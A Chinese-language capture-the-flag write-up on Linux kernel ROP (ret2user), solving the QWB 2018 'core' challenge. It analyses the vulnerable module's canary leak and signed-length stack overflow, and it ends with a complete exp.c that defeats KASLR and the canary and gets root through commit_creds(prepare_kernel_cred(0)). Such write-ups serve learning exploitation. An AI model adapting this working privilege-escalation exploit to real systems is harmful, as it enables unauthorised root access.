#   krop

>   像用户态漏洞利用一样，kernel-pwn 的介绍也从 rop 开始
>
>   不同的是我们的目标不再是单纯的 getshell 了，而是提权，本文会以[强网杯-2018-Core](../attachments/chpf-0/give_to_pwner.tar.gz) 为例，介绍 kernel-pwn 中 ret2user 的提权技巧

##  题目分析

对于大部分 kernel 题目，漏洞都出现在出题人编写的 LKM（Loadable kernel module）中，而 LKM 需要用 `insmod` 来加载到内核中，因此在 cpio 解包后就需要关注 init 文件来定位目标 LKM，然后拿到 ida 中进行分析。

本题的 init 文件中有两行内容值得关注：

```sh
cat /proc/kallsyms > /tmp/kallsyms
insmod /core.ko
```

其中，`/proc/kallsyms` 中包含内核函数地址信息，题目中很好心地把它复制到了 tmp 目录下，我们可以通过它来绕过 kaslr（内核函数地址随机化）；而第二行的 /core.ko 即本题的漏洞文件了。

ida 打开 core.ko 后可以关注 `.data` 段下的 `core_fops`，这是一个 `file_operations` 结构体，定义如下：

```c
struct file_operations {
	struct module *owner;
	loff_t (*llseek) (struct file *, loff_t, int);
	ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
	ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
	ssize_t (*read_iter) (struct kiocb *, struct iov_iter *);
	ssize_t (*write_iter) (struct kiocb *, struct iov_iter *);
	int (*iopoll)(struct kiocb *kiocb, struct io_comp_batch *,
			unsigned int flags);
	int (*iterate) (struct file *, struct dir_context *);
	int (*iterate_shared) (struct file *, struct dir_context *);
	__poll_t (*poll) (struct file *, struct poll_table_struct *);
	long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);
	long (*compat_ioctl) (struct file *, unsigned int, unsigned long);
	int (*mmap) (struct file *, struct vm_area_struct *);
	unsigned long mmap_supported_flags;
	int (*open) (struct inode *, struct file *);
	int (*flush) (struct file *, fl_owner_t id);
	int (*release) (struct inode *, struct file *);
	int (*fsync) (struct file *, loff_t, loff_t, int datasync);
	int (*fasync) (int, struct file *, int);
	int (*lock) (struct file *, int, struct file_lock *);
	ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);
	unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);
	int (*check_flags)(int);
	int (*flock) (struct file *, int, struct file_lock *);
	ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);
	ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);
	int (*setlease)(struct file *, long, struct file_lock **, void **);
	long (*fallocate)(struct file *file, int mode, loff_t offset,
			  loff_t len);
	void (*show_fdinfo)(struct seq_file *m, struct file *f);
#ifndef CONFIG_MMU
	unsigned (*mmap_capabilities)(struct file *);
#endif
	ssize_t (*copy_file_range)(struct file *, loff_t, struct file *,
			loff_t, size_t, unsigned int);
	loff_t (*remap_file_range)(struct file *file_in, loff_t pos_in,
				   struct file *file_out, loff_t pos_out,
				   loff_t len, unsigned int remap_flags);
	int (*fadvise)(struct file *, loff_t, loff_t, int);
} __randomize_layout;
```

与之对应的，如果某个函数指针域上不是 NULL，则在对 `int fd = open("/proc/core", 2);` 调用相关函数时，会转而调用表中对应的函数指针，如这里定义了 `write` 函数，则：

```c
int fd = open("/proc/core", 2);
write(fd, buffer, size);
```

这段代码就会调用到 `core_write` 函数上：

```c
signed __int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  printk("\x016core: called core_writen");
  if ( a3 <= 0x800 && !copy_from_user(name, a2, a3) )
    return (unsigned int)a3;
  printk("\x016core: error copying data from userspacen", a2);
  return 0xFFFFFFF2LL;
}
```

而这段函数实际做的事情就是从用户空间拷贝不超过 `0x800` 的数据到内核空间的变量上，其中 `copy_from_user(a1, a2, a3)` 函数的第一个参数 a1 为目标内核空间地址，a2 为源用户空间地址，a3 为长度。

再看到 `core_ioctl` 函数上，`ioctl` 函数是内核态与用户态交互的关键函数，里面定义了几种选项（可以理解为一种菜单）：

```c
__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
{
  switch ( a2 )
  {
    case 0x6677889B:
      core_read(a3);
      break;
    case 0x6677889C:
      printk("\x016core: %d\n", a3);
      off = a3;
      break;
    case 0x6677889A:
      printk("\x016core: called core_copy\n");
      core_copy_func(a3);
      break;
  }
  return 0LL;
}
```

依次查看这几个函数，发现 `core_read` 中复制内核栈上变量时的偏移量取决与第二个选项的全局变量 `off`：

```c
void __fastcall core_read(__int64 a1)
{
  char *bufptr; // rdi
  __int64 i; // rcx
  char buf[64]; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int64 v5; // [rsp+40h] [rbp-10h]

  v5 = __readgsqword(0x28u);
  printk("\x016core: called core_read\n");
  printk("\x016%d %p\n", off, (const void *)a1);
  bufptr = buf;
  for ( i = 16LL; i; --i )
  {
    *(_DWORD *)bufptr = 0;
    bufptr += 4;
  }
  strcpy(buf, "Welcome to the QWB CTF challenge.\n");
  if ( copy_to_user(a1, &buf[off], 64LL) )
    __asm { swapgs }
}
```

`checksec core.ko` 发现内核栈中一样是有 `canary` 保护的，而上面这个 `core_read` 函数就可以用来泄露得到 `canary`。

最后再观察 `core_copy_func`，发现存在负数溢出导致的栈溢出：

```c
void __fastcall core_copy_func(signed __int64 a1)
{
  char v1[64]; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int64 v2; // [rsp+40h] [rbp-10h]

  v2 = __readgsqword(0x28u);
  printk("\x016core: called core_writen");
  if ( a1 > 0x3F )
    printk("\x016Detect Overflow");
  else
    qmemcpy(v1, name, (unsigned __int16)a1);    // overflow
}
```

于是我们可以通过编写 c 程序调用 `core.ko`，实现劫持内核函数的控制流，思路明确如下：

-   1. 通过查找 `/tmp/kallsyms` 获得内核函数地址与 `kaslr` 偏移
-   2. `ioctl` 获得 `canary`
-   3. `write` 往内核变量 `name` 中写入 `ROP` 链
-   4. 通过 `core_copy_func` 的栈溢出劫持内核控制流

---

##  漏洞利用

上面只是对存在漏洞的 LKM 进行了分析，接下来看具体该怎么利用，即探讨 `kernel-ROP-ret2user` 的具体实现：

>   内核会通过进程的 `task_struct` 结构体中的 `cred` 指针来索引 `cred` 结构体，然后根据 `cred` 的内容来判断一个进程拥有的权限，如果 `cred` 结构体成员中的 `uid-fsgid` 都为 0，那一般就会认为进程具有 `root` 权限。

一种常见的提权方式就是执行 `commit_creds(prepare_kernel_cred(0))`，方式会自动生成一个合法的 `cred`，并定位当前线程的 `task_struct` 的位置，然后修改它的 `cred` 为新的 `cred`。该方式比较适用于控制程序执行流后使用。

通过获取 `kaslr` 偏移地址，就可以得到上面两个内核函数和 `rop gadgets` 的地址，但是在内核态返回用户态的时候，还需要额外执行 `swapgs; iretq` 来恢复用户态的现场，即 `iretq` 后跟：

```c
iretq_ret;
(size_t)RET_ADDR;
user_cs;
user_rflags;
user_sp;
user_ss;
```

同时，程序最开始的地方也要保存用户态的现场：

```c
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
    );
    puts("[*]status has been saved.");
}
```

## 最终 exp.c

```c
// author: @eastXueLian
// usage : musl-gcc ./exp.c -static -masm=intel -o ./core/exp

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#define lg(X) printf("\033[1;31;40m[*] %s --> 0x%lx \033[0m\n", (#X), (X))

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
    );
    puts("[*]status has been saved.");
}
void get_shell(void) {
    system("/bin/sh");
}

size_t commit_creds_addr, prepare_kernel_cred_addr, kaslr_offset;
void get_func_addrs() {
    FILE *fd = fopen("/tmp/kallsyms", "r");
    size_t cur_addr;
    char cur_type[0x10];
    char cur_func[0x40];
    char found = 0;

    while ( fscanf(fd, "%lx%s%s", &cur_addr, cur_type, cur_func) ) {
        if (found == 2)
            return;
        if (!strcmp(cur_func, "commit_creds")) {
            commit_creds_addr = cur_addr;
            kaslr_offset = commit_creds_addr - 0xffffffff8109c8e0;
            lg(kaslr_offset);
            lg(commit_creds_addr);
            found++;
        }
        if (!strcmp(cur_func, "prepare_kernel_cred")) {
            prepare_kernel_cred_addr = cur_addr;
            lg(prepare_kernel_cred_addr);
            found++;
        }
    }
}

void get_root() {
    void* (*a)(int) = prepare_kernel_cred_addr;
    void (*b)(void*) = commit_creds_addr;
    (*b)((*a)(0));
}

int main() {

    save_status();
    get_func_addrs();

    size_t pop_rdi_ret, pop_rsi_ret, pop_rdx_ret;
    pop_rdi_ret = kaslr_offset + 0xffffffff81000b2f;
    pop_rsi_ret = kaslr_offset + 0xffffffff810011d6;
    pop_rdx_ret = kaslr_offset + 0xffffffff81021e53;
    size_t swapgs_popfq_ret = kaslr_offset + 0xffffffff81a012da;
    size_t iretq_ret = kaslr_offset + 0xffffffff81050ac2;

    int fd = open("/proc/core", 2);
    size_t buf[0x800];
    ioctl(fd, 0x6677889C, 0x40);
    ioctl(fd, 0x6677889B, buf);
    size_t canary = buf[0];
    lg(canary);

    int i = 0x40/8;
    buf[i++] = canary;
    buf[i++] = 0xdeadbeef;
    buf[i++] = (size_t)get_root;

    buf[i++] = swapgs_popfq_ret;
    buf[i++] = 0;
    buf[i++] = iretq_ret;
    buf[i++] = (size_t)get_shell;
    buf[i++] = user_cs;
    buf[i++] = user_rflags;
    buf[i++] = user_sp;
    buf[i++] = user_ss;

    write(fd, buf, 0x800);
    ioctl(fd, 0x6677889A, 0xffffffffffff0000|0x100);

    return 0;
}
```

---
